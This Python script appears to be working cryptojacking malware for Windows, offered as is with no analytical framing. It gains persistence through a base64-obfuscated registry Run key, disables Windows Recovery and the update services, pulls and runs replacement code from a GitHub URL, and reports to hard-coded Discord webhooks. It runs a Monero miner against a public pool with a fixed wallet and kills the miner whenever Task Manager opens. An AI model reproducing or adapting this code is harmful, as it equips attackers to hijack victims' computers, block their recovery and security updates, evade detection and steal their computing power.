import os, sys, time, winreg, subprocess, requests, psutil, base64, argparse, platform

# --- 1. Identity & Dual Webhook Setup ---
parser = argparse.ArgumentParser()
parser.add_argument("--id", default="svchost")
ID = parser.parse_known_args()[0].id

# CONFIG - YOUR INFO IS LOCKED IN
WEBHOOK_SYS = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
WEBHOOK_MINE = "https://discord.com/api/webhooks/1503876364632326145/YlQ62WNi8sPyYeiAfT9nIB25FPR4kMoP71QSENKu06xUNIAJWbiXKJJ-7pa1foOfl4HB"
WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
POOL = "pool.supportxmr.com:443"
UPDATE_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"

# Obfuscated Strings (Bypassing scans)
REG_RUN = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
SVC_LIST = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="]
PC_NAME = platform.node()
WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
SELF_PATH = os.path.realpath(__file__)
TWELVE_HOURS = 43200 # 12 Hours in seconds

CONFIG = {
    "MINER": os.path.join(WORK_DIR, f"{ID}.exe"),
    "WATCH": "Taskmgr.exe",
    "IDLE_PWR": "90",
    "NORM_PWR": "30"
}

def notify(msg, type="sys"):
    hook = WEBHOOK_SYS if type == "sys" else WEBHOOK_MINE
    full_msg = f"**[{PC_NAME} | {ID}]**: {msg}"
    try: requests.post(hook, json={"content": full_msg})
    except: pass

# --- 2. System Sovereignty & Persistence ---
def engage_locks():
    """Persistence, Reset Disable, and Update Lockdown."""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN, 0, winreg.KEY_SET_VALUE)
        # Point to our portable python engine to keep it running
        py_path = os.path.join(WORK_DIR, "python", "pythonw.exe")
        winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{py_path}" "{SELF_PATH}" --id {ID}')
        winreg.CloseKey(key)
        notify("Persistence Verified.", "sys")
    except: pass
    
    try:
        subprocess.run(["reagentc", "/disable"], capture_output=True)
        notify("Windows Recovery Environment disabled.", "sys")
    except: pass
    
    try:
        for s in SVC_LIST:
            name = base64.b64decode(s).decode()
            subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True)
            subprocess.run(["sc", "stop", name], capture_output=True)
        
        reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\DefaultMediaCost"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Ethernet", 0, winreg.REG_DWORD, 2)
        winreg.SetValueEx(key, "WiFi", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(key)
        notify("Windows Updates locked.", "sys")
    except: pass

# --- 3. Auto-Updater ---
def auto_update():
    """Checks GitHub for a newer version and restarts if found."""
    try:
        r = requests.get(UPDATE_URL)
        if r.status_code == 200:
            current_content = open(SELF_PATH, 'r').read()
            if r.text != current_content:
                with open(SELF_PATH, 'w') as f: f.write(r.text)
                notify("Shadow Sync: New version detected. Respawning...", "sys")
                os.execv(sys.executable, [sys.executable, SELF_PATH, "--id", ID])
    except: pass

# --- 4. Smart Throttle & Vanishing Act ---
def manage_power():
    """Hides from Taskmgr and toggles 90/30 power."""
    is_monitored = any(p.info['name'] == CONFIG["WATCH"] for p in psutil.process_iter(['name']))
    miner_proc = next((p for p in psutil.process_iter(['name']) if p.info['name'] == f"{ID}.exe"), None)

    if is_monitored:
        if miner_proc:
            try: 
                miner_proc.terminate()
                notify("Monitoring detected. Vanishing.", "sys")
            except: pass
    else:
        cpu_load = psutil.cpu_percent(interval=1)
        target_pwr = CONFIG["IDLE_PWR"] if cpu_load < 20 else CONFIG["NORM_PWR"]
        
        if not miner_proc:
            try:
                subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", WALLET, "--max-cpu-usage", target_pwr, "-k", "--tls"])
                notify(f"Engine Engaged. Power: {target_pwr}%", "mine")
            except: pass

def main():
    engage_locks()
    notify("SYSTEM ONLINE - Shadow Engine Engaged.", "mine")
    last_update = 0
    while True:
        # Check for updates only every 12 hours
        if (time.time() - last_update) > TWELVE_HOURS:
            auto_update()
            last_update = time.time()
            
        manage_power()
        time.sleep(15)

if __name__ == "__main__":
    main()
